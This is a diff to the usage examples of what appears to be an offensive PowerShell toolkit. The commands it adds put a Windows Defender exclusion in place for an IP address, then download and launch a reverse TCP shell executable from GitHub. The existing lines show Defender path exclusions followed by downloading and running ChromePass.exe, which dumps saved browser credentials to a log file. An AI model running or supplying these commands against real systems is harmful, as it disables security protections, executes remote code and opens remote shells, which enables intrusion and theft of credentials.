@@ -44,12 +44,21 @@ Get-help .\Invoke-Exclusions.ps1 -Full
 #Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
 .\Invoke-Exclusions.ps1 -action "add" -type "ExclusionPath" -Exclude "$Env:TMP"
 
+#Set-MpPreference -ExclusionIpAddress "192.168.1.72" -Force
+.\Invoke-Exclusions.ps1 -action "add" -type "ExclusionIpAddress" -Exclude "192.168.1.72"
+
 
 ## Add exclusion Path + Download URI PE + Execute PE
 # 1º - Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
 # 2º - Iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -OutFile "$Env:TMP\ChromePass.exe"
 # 3º - cd $Env:TMP; .\ChromePass.exe /stext credentials.log
 .\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionPath" -Exclude "$Env:TMP" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -Arguments "/stext credentials.log"
+
+## Add exclusion Path + Download URI PE + Execute PE
+# 1º - Set-MpPreference -ExclusionIpAddress "192.168.1.72" -Force
+# 2º - Iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/.../RevTcpShell.exe" -OutFile "$Env:TMP\RevTcpShell.exe"
+# 3º - cd $Env:TMP; Start-Process RevTcpShell.exe
+.\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionIpAddress" -Exclude "192.168.1.72" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/..../RevTcpShell.exe" 
 
 
 #Remove-MpPreference -ExclusionProcess "cmd" Force
